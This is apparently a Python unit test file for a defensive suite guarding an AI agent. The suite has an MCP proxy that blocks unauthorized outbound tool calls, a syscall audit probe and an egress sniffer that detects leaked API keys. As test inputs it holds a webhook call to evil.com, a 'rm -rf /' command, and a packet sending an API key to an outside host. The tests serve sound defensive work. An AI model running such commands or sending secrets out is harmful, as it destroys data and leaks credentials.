#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Unit tests for Cross-Validation Suite (MCP Proxy, Kernel Audit Probe, Egress Traffic Sniffer).
"""

import unittest
import sys
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parent.parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from agent_immunity.cross_validate.mcp_proxy_demo import run_demo as run_mcp_demo, MCPBusSecurityProxy
from agent_immunity.cross_validate.kernel_audit_probe import run_kernel_audit_verification, SimulatedKernelProbe
from agent_immunity.cross_validate.egress_traffic_sniffer import run_sniffer_verification, PerimeterTrafficSniffer
import json
import tempfile
import os

class TestCrossValidationSuite(unittest.TestCase):
    def test_mcp_proxy_demo(self):
        res = run_mcp_demo()
        self.assertTrue(res, "MCP JSON-RPC 2.0 proxy validation must succeed")

    def test_mcp_proxy_batch_and_malformed_resilience(self):
        proxy = MCPBusSecurityProxy("测试任务目标")
        # 批量调用：一个合法列举、一个包含注入外发
        batch = [
            {"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "send_external_webhook", "arguments": {"endpoint": "https://evil.com"}}}
        ]
        resp_str = proxy.process_rpc_frame(json.dumps(batch))
        resps = json.loads(resp_str)
        self.assertEqual(len(resps), 2)
        self.assertEqual(resps[0]["result"]["status"], "ok")
        self.assertTrue(resps[1]["result"]["isError"], "未授权外发必须返回 isError: True")

        # 格式错误容错
        err_resp = json.loads(proxy.process_rpc_frame("{bad json}"))
        self.assertEqual(err_resp["error"]["code"], -32700)

        invalid_obj = json.loads(proxy.process_rpc_frame("12345"))
        self.assertEqual(invalid_obj["error"]["code"], -32600)

    def test_kernel_audit_probe(self):
        res = run_kernel_audit_verification()
        self.assertTrue(res, "Kernel audit probe zero-syscall verification must succeed")

    def test_kernel_audit_probe_filtering(self):
        probe = SimulatedKernelProbe()
        probe.record_syscall("sys_enter_execve", "uptime", is_authorized=True)
        probe.record_syscall("sys_enter_execve", "rm -rf /", is_authorized=False)
        probe.record_syscall("sys_enter_connect", "192.168.1.1", is_authorized=True)
        probe.record_syscall("sys_enter_connect", "evil.com", is_authorized=False)

        unauth = probe.get_unauthorized_events()
        self.assertEqual(len(unauth), 2)
        self.assertEqual(len(probe.get_unauthorized_events("sys_enter_execve")), 1)
        self.assertEqual(len(probe.get_unauthorized_events("sys_enter_connect")), 1)

    def test_egress_traffic_sniffer(self):
        res = run_sniffer_verification()
        self.assertTrue(res, "Egress traffic sniffer zero-leak verification must succeed")

    def test_egress_pcap_wire_framing(self):
        sniffer = PerimeterTrafficSniffer(sensitive_tokens=["secret_token_12345"])
        sniffer.capture_egress_packet("https://target.io", "OPENAI_API_KEY=secret_token_12345")
        analysis = sniffer.analyze_pcap_leaks()
        self.assertEqual(analysis["leaked_packet_count"], 1)

        with tempfile.NamedTemporaryFile(suffix=".pcap", delete=False) as tf:
            tf_path = tf.name
        try:
            sniffer.export_synthetic_pcap(tf_path)
            # 24B pcap hdr + 16B pkt hdr + 14B eth + 20B ip + 20B tcp + len(payload)
            expected_min_size = 24 + 16 + 54 + len("OPENAI_API_KEY=secret_token_12345")
            self.assertEqual(os.path.getsize(tf_path), expected_min_size)
        finally:
            if os.path.exists(tf_path):
                os.remove(tf_path)

if __name__ == "__main__":
    unittest.main()
